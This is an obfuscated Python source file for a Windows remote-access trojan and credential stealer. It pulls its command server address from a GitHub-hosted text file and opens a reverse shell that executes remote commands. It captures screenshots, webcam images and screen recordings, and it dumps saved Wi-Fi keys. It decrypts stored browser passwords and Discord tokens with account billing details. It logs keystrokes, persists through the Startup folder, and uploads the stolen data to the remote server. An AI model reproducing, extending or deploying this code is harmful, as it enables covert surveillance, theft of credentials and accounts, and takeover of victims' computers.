import subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
IXTGlMuDLSwVXKsSAnPxP = ""
bAmkdaThdNP = ""
dwrxaaiGsOkKWjhdiiyKmDU = "19.02.25.0"
ygyBRfJyWjPQvzrKbYxM = True
oIGUtkbWMopYhRxLeEco = "!"
tzvjiMWqBeg = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
rvWUuCoIkHEslrAD = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
DuShsUaDnBQoQlvwXO = os.path.expanduser("~\\AppData\\Local\\")
urNYPtnIgGrgqVyaCxwPmER = os.path.expanduser("~\\AppData\\Roaming\\")
OZaaRmXCzSkWbYlOyWQWcj = ""
qDCrmzkoGMpQF = {
	'chrome':DuShsUaDnBQoQlvwXO+'Google\\Chrome\\User Data','chromium':DuShsUaDnBQoQlvwXO+'Chromium\\User Data','chrome-canary':DuShsUaDnBQoQlvwXO+'Google\\Chrome SxS\\User Data',
	'msedge':DuShsUaDnBQoQlvwXO+'Microsoft\\Edge\\User Data','msedge-canary':DuShsUaDnBQoQlvwXO+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':DuShsUaDnBQoQlvwXO+'Microsoft\\Edge Beta\\User Data','msedge-dev':DuShsUaDnBQoQlvwXO+'Microsoft\\Edge Dev\\User Data',
	'avast':DuShsUaDnBQoQlvwXO+'AVAST Software\\Browser\\User Data','amigo':DuShsUaDnBQoQlvwXO+'Amigo\\User Data',
	'torch':DuShsUaDnBQoQlvwXO+'Torch\\User Data','kometa':DuShsUaDnBQoQlvwXO+'Kometa\\User Data','orbitum':DuShsUaDnBQoQlvwXO+'Orbitum\\User Data',
	'cent-browser':DuShsUaDnBQoQlvwXO+'CentBrowser\\User Data','7star':DuShsUaDnBQoQlvwXO+'7Star\\7Star\\User Data',
	'sputnik':DuShsUaDnBQoQlvwXO+'Sputnik\\Sputnik\\User Data','vivaldi':DuShsUaDnBQoQlvwXO+'Vivaldi\\User Data',
	'epic-privacy-browser':DuShsUaDnBQoQlvwXO+'Epic Privacy Browser\\User Data','uran':DuShsUaDnBQoQlvwXO+'uCozMedia\\Uran\\User Data',
	'yandex':DuShsUaDnBQoQlvwXO+'Yandex\\YandexBrowser\\User Data','brave':DuShsUaDnBQoQlvwXO+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':DuShsUaDnBQoQlvwXO+'Iridium\\User Data','coccoc':DuShsUaDnBQoQlvwXO+'CocCoc\\Browser\\User Data',
	'opera':urNYPtnIgGrgqVyaCxwPmER+'Opera Software\\Opera Stable','opera-gx':urNYPtnIgGrgqVyaCxwPmER+'Opera Software\\Opera GX Stable'
}
def zGzDEUQcxe(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def GhbERKIVJtTtp(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	nnJyWBa = data.decode("utf-8").replace("\n","")
	if not nnJyWBa.startswith(oIGUtkbWMopYhRxLeEco):
		proc = subprocess.run(nnJyWBa, shell=True, capture_output=True)
		YIDyQueGzRJqfkUu = proc.stdout + proc.stderr
		ypPjtzNXfAemPtPY(s, YIDyQueGzRJqfkUu)
		return
	ByCwFKdGKPBggcxjaRNw = nnJyWBa.split(" ")[0][1:]
	args = " ".join(nnJyWBa.split()[1:]).split()
	if ByCwFKdGKPBggcxjaRNw == "download":
		NvKcpeIwCGWPUPncBVfJf(s, nnJyWBa)
	elif ByCwFKdGKPBggcxjaRNw == "screenshot":
		RLwuXtdeJtzVNkdpCZN(s)
	elif ByCwFKdGKPBggcxjaRNw == "basename":
		ypPjtzNXfAemPtPY(s, os.path.basename(__file__))
	elif ByCwFKdGKPBggcxjaRNw == "update":
		fRSidRHq(s)
	elif ByCwFKdGKPBggcxjaRNw == "wifi":
		OCjGazezqg(s)
	elif ByCwFKdGKPBggcxjaRNw == "screenrecord":
		rYhctzOH(s, args)
	elif ByCwFKdGKPBggcxjaRNw == "browsers":
		nYoeMdWN(s)
	elif ByCwFKdGKPBggcxjaRNw == "webcam":
		webCam(s, args)
	elif ByCwFKdGKPBggcxjaRNw == "cd":
		try:
			os.chdir(nnJyWBa[4:])
			ypPjtzNXfAemPtPY(s,"")
		except: pass
	else:
		ypPjtzNXfAemPtPY(s,"")
def NvKcpeIwCGWPUPncBVfJf(s, nnJyWBa):
	PThXEOMFjZ = nnJyWBa.replace(oIGUtkbWMopYhRxLeEco+"download ","").split(",")
	YIDyQueGzRJqfkUus = ""
	for f in PThXEOMFjZ:
		YIDyQueGzRJqfkUus += ZJtMPryViHOHHbLXPw(f, "api/file/", { "type":os.path.splitext(f)[1] })
	ypPjtzNXfAemPtPY(s, YIDyQueGzRJqfkUus)
def RLwuXtdeJtzVNkdpCZN(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	msbflViXjr = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(msbflViXjr)
	image.close()
	YIDyQueGzRJqfkUu = ZJtMPryViHOHHbLXPw(msbflViXjr, "api/sscap")
	os.remove(msbflViXjr)
	ypPjtzNXfAemPtPY(s, YIDyQueGzRJqfkUu)
def webCam(s, args):
	import imageio
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(DuShsUaDnBQoQlvwXO+"wc.jpg", camera.get_data(0))
		camera.close()
		r=ZJtMPryViHOHHbLXPw(DuShsUaDnBQoQlvwXO+"wc.jpg","api/wc")
		ypPjtzNXfAemPtPY(s, r)
	except:
		ypPjtzNXfAemPtPY(s, "[!] 404")
def rYhctzOH(s, args):
	import imageio
	from PIL import ImageGrab
	XlzwRUcbS = 15
	if not args == []:
		try: XlzwRUcbS = int(args[0])
		except: pass
	wbewMauSEnURSZUspG = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	ziJKmuvgxBETIuzB = []
	fps = 11
	numFrames = XlzwRUcbS * fps
	for _ in range(numFrames):
		ziJKmuvgxBETIuzB.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(wbewMauSEnURSZUspG, ziJKmuvgxBETIuzB, fps=fps, quality=8)
	r=ZJtMPryViHOHHbLXPw(wbewMauSEnURSZUspG, "api/screc")
	os.remove(wbewMauSEnURSZUspG)
	ypPjtzNXfAemPtPY(s, r)
def ZJtMPryViHOHHbLXPw(vBaUXZHUtepSjyO, QrZcRAnajqZiow, mDSOaxIzyAQyblnYz=None):
	import requests
	if not os.path.isfile(vBaUXZHUtepSjyO):
		return "[!] 404: "+vBaUXZHUtepSjyO+"\n"
	headers = {"user":os.getlogin()}
	if mDSOaxIzyAQyblnYz is not None:
		headers = {**headers, **mDSOaxIzyAQyblnYz}
	f = open(vBaUXZHUtepSjyO, "rb")
	requests.post("http://"+IXTGlMuDLSwVXKsSAnPxP+":5555/"+QrZcRAnajqZiow,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def vyQZAyOpjISjsfaIMl(fmewQYyeRObjdbVbweklyXN, QrZcRAnajqZiow):
	import requests
	if fmewQYyeRObjdbVbweklyXN.strip() == "":
		return "[!] 204"
	requests.post("http://"+IXTGlMuDLSwVXKsSAnPxP+":5555/"+QrZcRAnajqZiow,
		data=fmewQYyeRObjdbVbweklyXN,
		headers={"user":os.getlogin()})
	return "[+] 200"
def fRSidRHq(s):
	h, p, v = xsXIsKrXmgB(True)
	if (v != dwrxaaiGsOkKWjhdiiyKmDU):
		tdHTnuTxtR(v)
		ypPjtzNXfAemPtPY(s, "[+] 200")
	else:
		ypPjtzNXfAemPtPY(s, "[-] 304")
def OCjGazezqg(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		ypPjtzNXfAemPtPY(s, "[!] 500")
		return
	OFfRYOAbqAZxghu = ""
	for p in profiles:
		try: OFfRYOAbqAZxghu+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: OFfRYOAbqAZxghu+=f"    {p} - N/A"
	ypPjtzNXfAemPtPY(s, OFfRYOAbqAZxghu)
def tdHTnuTxtR(MnDHmdHFnBhkxQSGAH):
	import requests
	global ygyBRfJyWjPQvzrKbYxM
	ZyaTZOBjSvtjYW = os.path.basename(__file__)
	fileType = ZyaTZOBjSvtjYW.split(".")[-1]
	JQHNpuj = ZyaTZOBjSvtjYW.split(".")[0]+"."+MnDHmdHFnBhkxQSGAH+".pyw" if fileType.startswith("py") else ".exe"
	MPZSvUztDefGkrOIgTmCqM = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), JQHNpuj)
	if not os.path.isfile(MPZSvUztDefGkrOIgTmCqM):
		with open(MPZSvUztDefGkrOIgTmCqM, "w+") as f:
			f.write(requests.get(rvWUuCoIkHEslrAD+"file."+ "pyw" if MPZSvUztDefGkrOIgTmCqM.split(".")[-1].startswith("py") else "exe").text)
	else:
		ygyBRfJyWjPQvzrKbYxM = False
def xsXIsKrXmgB(force=False):
	global IXTGlMuDLSwVXKsSAnPxP, bAmkdaThdNP
	import requests
	if force or IXTGlMuDLSwVXKsSAnPxP == "" or bAmkdaThdNP == "":
		attempts = 3
		while attempts != 0:
			try:
				data = requests.get(tzvjiMWqBeg).text.replace("\n","").split(":")
				IXTGlMuDLSwVXKsSAnPxP = data[0].strip()
				bAmkdaThdNP = data[1].strip()
				MnDHmdHFnBhkxQSGAH = data[2].strip()
				return IXTGlMuDLSwVXKsSAnPxP, bAmkdaThdNP, MnDHmdHFnBhkxQSGAH
			except:
				attempts -= 1
				time.sleep(10)
def jFzJfPfQMVeTltnKGQEAj():
	try:
		KQSUivhJprMerGIpjdkofU = "settings.xpb"
		fJeiYCggFxhaXVQJSr = sorted([file for file in os.listdir(DuShsUaDnBQoQlvwXO) if os.path.isfile(DuShsUaDnBQoQlvwXO+"\\"+file) and file.endswith(KQSUivhJprMerGIpjdkofU.split(".")[-1])])
		if KQSUivhJprMerGIpjdkofU in fJeiYCggFxhaXVQJSr:
			fJeiYCggFxhaXVQJSr.remove(KQSUivhJprMerGIpjdkofU)
		kqdNQliV = os.path.join(DuShsUaDnBQoQlvwXO,KQSUivhJprMerGIpjdkofU)
		if len(fJeiYCggFxhaXVQJSr) > 0:
			with open(kqdNQliV, "ab+") as f:
				for file in fJeiYCggFxhaXVQJSr:
					temp = os.path.join(DuShsUaDnBQoQlvwXO,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		ZJtMPryViHOHHbLXPw(kqdNQliV, "api/log")
		if os.path.isfile(kqdNQliV):
			os.remove(kqdNQliV)
	except:
		pass
def xbUCLZYXfSznbdOZcroZi():
	from pynput.keyboard import Key, Listener
	import logging
	logging.basicConfig(filename=(DuShsUaDnBQoQlvwXO+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def HaduDwfDMbRnVTiTlYW(k):
		logging.info(str(k))
	k=Listener(on_press=HaduDwfDMbRnVTiTlYW)
	JDkdImxazmwAjJjxwsjjfMr = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in JDkdImxazmwAjJjxwsjjfMr:
		l.setLevel(logging.CRITICAL)
	k.start()
def nYoeMdWN(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        UkqwRkJUP = "\n"
        for browser in qDCrmzkoGMpQF:
                path = qDCrmzkoGMpQF[browser]
                zrgugiJlMGtnLcBjTUzzox = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        zrgugiJlMGtnLcBjTUzzox = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", DuShsUaDnBQoQlvwXO+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(DuShsUaDnBQoQlvwXO+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        UkqwRkJUP += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(zrgugiJlMGtnLcBjTUzzox, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                UkqwRkJUP += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(DuShsUaDnBQoQlvwXO+"\\db.db")
        IwywxLgSxlsGdtT = []
        discordPaths = [urNYPtnIgGrgqVyaCxwPmER+'\\discord\\Local Storage\\leveldb\\',urNYPtnIgGrgqVyaCxwPmER+'\\discordcanary\\Local Storage\\leveldb\\',urNYPtnIgGrgqVyaCxwPmER+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                zrgugiJlMGtnLcBjTUzzox = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        zrgugiJlMGtnLcBjTUzzox = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(zrgugiJlMGtnLcBjTUzzox, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in IwywxLgSxlsGdtT:
                                                IwywxLgSxlsGdtT.append(decryptedToken)
        NtjRAzMyVdaQVnDXJknPan = "https://discord.com/api/v9/users/@me"
        if IwywxLgSxlsGdtT: UkqwRkJUP +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for WbRAubdVjzAuwr in IwywxLgSxlsGdtT:
                headers = {"Content-Type":"application/json","Authorization":WbRAubdVjzAuwr,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(NtjRAzMyVdaQVnDXJknPan, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(NtjRAzMyVdaQVnDXJknPan+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(NtjRAzMyVdaQVnDXJknPan+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                UkqwRkJUP += f"\n{user}\n{'-'*len(user)}\nToken: {WbRAubdVjzAuwr}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        UkqwRkJUP += "\n\n"
        if not upload:
                ypPjtzNXfAemPtPY(s, UkqwRkJUP)
        else:
                vyQZAyOpjISjsfaIMl(UkqwRkJUP, "api/google")
def ypPjtzNXfAemPtPY(clientSocket, fmewQYyeRObjdbVbweklyXN):
	formattedData = b""
	if type(fmewQYyeRObjdbVbweklyXN) == bytes:
		formattedData += fmewQYyeRObjdbVbweklyXN
	else:
		formattedData += bytes(fmewQYyeRObjdbVbweklyXN, "utf-8")
	formattedData += bytes("\n"+OZaaRmXCzSkWbYlOyWQWcj+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def iTsAcMoCmauIfErjrHFHoBD():
	global OZaaRmXCzSkWbYlOyWQWcj
	h, p, v = xsXIsKrXmgB()
	try:jFzJfPfQMVeTltnKGQEAj()
	except: pass
	try:
		if dwrxaaiGsOkKWjhdiiyKmDU != v:
			tdHTnuTxtR(v)
	except: pass
	try:
		if ygyBRfJyWjPQvzrKbYxM:
			nYoeMdWN(None,True)
	except: pass
	try:
		if ygyBRfJyWjPQvzrKbYxM:
			xbUCLZYXfSznbdOZcroZi()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	OZaaRmXCzSkWbYlOyWQWcj = ("(old)"if dwrxaaiGsOkKWjhdiiyKmDU!=v else "")+"["+dwrxaaiGsOkKWjhdiiyKmDU+"] "+os.getlogin()+" - "
	while True:
		pGhkFIGyUdGMsBjpQ=False
		try:
			s=zGzDEUQcxe(h, p)
			ypPjtzNXfAemPtPY(s, "")
			while not pGhkFIGyUdGMsBjpQ:
				pGhkFIGyUdGMsBjpQ=GhbERKIVJtTtp(s)
			s.close()
		except:
			pass
		time.sleep(5)
iTsAcMoCmauIfErjrHFHoBD()